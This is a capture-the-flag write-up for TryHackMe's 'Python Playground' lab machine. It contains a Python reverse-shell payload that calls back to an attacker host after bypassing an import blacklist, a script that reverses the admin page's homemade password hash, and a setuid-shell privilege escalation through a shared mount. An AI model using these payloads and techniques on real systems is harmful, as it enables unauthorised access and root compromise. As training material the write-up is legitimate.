# Python Playground write-up

A hard level TryHackme room.

## Flag-1
Nmap enumeration:
```
nmap -sV -sC -p- -T5 ip_addres_after_deploy
```

Nmap found 2 services"

Port    |   Service
--------|-----------
22      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80      | Node.js Express framework 

Node.js web page welcomes us with following information:

```
Secure Python Playground

Introducing the new era code sandbox; python playground! 
Normally, code playgrounds that execute code serverside are easy ways for hackers to access a system.
Not anymore! With our new, foolproof blacklist, no one can break into our servers, a
nd we can all enjoy the convenience of running our python code on the cloud!

Login Sign up 

```

*Login* and *Sign Up* redirects us to pages *login.html* and *signup.html* with folowing information:

```
Sorry, but due to some recent security issues, only admins can use the site right now. Don't worry, the developers will fix it soon :) 
```

Lets check if there is more html files and enumerate web.
```
gobuster dir -u http://ip-address -w /usr/share/dirb/wordlists/common.txt -x html

...
/admin.html (Status: 200)
...
```

The command found **admin.html** file.

Admin page (http://ip-address/admin.html) welcomes use with login form **Connor's Secret Admin Backdoor**.

As we do not have connor's credentials lets examine html source.
The source shows some interesting code:

```
   <script>
      // I suck at server side code, luckily I know how to make things secure without it - Connor

      function string_to_int_array(str){
        const intArr = [];

        for(let i=0;i<str.length;i++){
          const charcode = str.charCodeAt(i);

          const partA = Math.floor(charcode / 26);
          const partB = charcode % 26;

          intArr.push(partA);
          intArr.push(partB);
        }

        return intArr;
      }

      function int_array_to_text(int_array){
        let txt = '';

        for(let i=0;i<int_array.length;i++){
          txt += String.fromCharCode(97 + int_array[i]);
        }

        return txt;
      }

      document.forms[0].onsubmit = function (e){
          e.preventDefault();

          if(document.getElementById('username').value !== 'connor'){
            document.getElementById('fail').style.display = '';
            return false;
          }

          const chosenPass = document.getElementById('inputPassword').value;

          const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(chosenPass))));

          if(hash === 'dxeedxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'){
            window.location = 'super-secret-admin-testing-panel.html';
          }else {
            document.getElementById('fail').style.display = '';
          }
          return false;
      }
  </script>
```

After successfully authentication we are redirected to a page **super-secret-admin-testing-panel.html**.
Lets leave for now part related to hash generating and open new html page.

Page http://ip-address/super-secret-admin-testing-panel.html provides us with Python web console when we can put our code.
Unfortunatelly there is some restrictions. For example **import** statement is restricted.
Lets try to bypass this restriction. 
We can try to use **\_\_import\_\_** statement.
Knowing this we can prepare our code, bypass restrictions and get reverse shell with following code:
```
o = __import__('os')
s = __import__('socket')
p = __import__('subprocess')

k=s.socket(s.AF_INET,s.SOCK_STREAM)
k.connect(("YOUR_HOST_IP_ADDRESS",7345))
o.dup2(k.fileno(),0)
o.dup2(k.fileno(),1)
o.dup2(k.fileno(),2)
c=p.call(["/bin/sh","-i"]);
```

Execute your listener:
```
nc -nvlp 7345
```

and run the code from python web console.

We should get our shell now:
```
listening on [any] 7345 ...
connect to [10.8.X.X] from (UNKNOWN) [10.10.X.X] 34130
/bin/sh: 0: can't access tty; job control turned off
# cd /root
# ls
app
flag1.txt
# cat flag1.txt
THM{XXXXXXXXXXXXXXXXXXXX}
#
```

## Flag-2

In addition to Node.js service there is also SSH. 
The only information about credentials we have comes from **admin.html** page (username: Connor, hashed password, functions generating password's hash).
```
<script>
      // I suck at server side code, luckily I know how to make things secure without it - Connor

      function string_to_int_array(str){
        const intArr = [];

        for(let i=0;i<str.length;i++){
          const charcode = str.charCodeAt(i);

          const partA = Math.floor(charcode / 26);
          const partB = charcode % 26;

          intArr.push(partA);
          intArr.push(partB);
        }

        return intArr;
      }

      function int_array_to_text(int_array){
        let txt = '';

        for(let i=0;i<int_array.length;i++){
          txt += String.fromCharCode(97 + int_array[i]);
        }

        return txt;
      }

      document.forms[0].onsubmit = function (e){
          e.preventDefault();

          if(document.getElementById('username').value !== 'connor'){
            document.getElementById('fail').style.display = '';
            return false;
          }

          const chosenPass = document.getElementById('inputPassword').value;

          const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(chosenPass))));

          if(hash === 'dxeedxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'){
            window.location = 'super-secret-admin-testing-panel.html';
```            

The hash revert process is required to find Connor's password. Hash is generating by executing two functions, two times each:
**string_to_int_array** and **int_array_to_text**.

The hashed password is known: **'dxeedxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'**. 

After analyzing mentioned functions our final code for getting connor password is:

```
import string
import math

characters = string.digits + string.ascii_lowercase

hashstring = 'dxeedxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'

ord_chars = [ ord(i) for i in hashstring ]


password = [ ord(j) for i in range(1,len(ord_chars),2)
        for j in characters if (ord(j) % 26 + 97) == ord_chars[i]
        and (math.floor(ord(j)/26) + 97) == ord_chars[i-1] ]

password = [ j for i in range(1,len(password),2)
        for j in characters if (ord(j) % 26 + 97) == password[i]
        and (math.floor(ord(j)/26) + 97) == password[i-1] ]

print("Connor's password is: " + ''.join(password))
```

Knowing connor's password we can try login using ssh:

```
ssh connor@10.10.X.X
connor@10.10.X.X's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun 10 13:54:39 UTC 2020

  System load:  0.0               Processes:              95
  Usage of /:   50.5% of 9.78GB   Users logged in:        0
  Memory usage: 25%               IP address for eth0:    10.10.X.X
  Swap usage:   0%                IP address for docker0: 172.17.X.X


32 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun 10 11:48:49 2020 from 10.8.X.X
connor@pythonplayground:~$ ls
flag2.txt
connor@pythonplayground:~$ cat flag2.txt 
THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
connor@pythonplayground:~$
```

## Flag-3

To get flag3 we have to back to **flag-1** solution and enumerate host again after reverse shell.
There is mount point /mnt/log. Close look shows us that this directory contains logs from machine we logged in using Connor's credentials. As we are root on this machine, prepare something for connor to help him get a root.
```
# cp /bin/sh /mnt/log
# chmod +s /mnt/log/sh
# ls -l /mnt/log/sh
-rwsr-sr-x 1 root root 129816 Jun 10 14:09 /mnt/log/sh
#
```

Now we need to back to connor's ssh session and execute:
```
connor@pythonplayground:~$ /var/log/sh -p
# cd /root/
# ls
flag3.txt
# cat flag3.txt
THM{xxxxxxxxxxxxxxxxxxxxxxx}
#
```

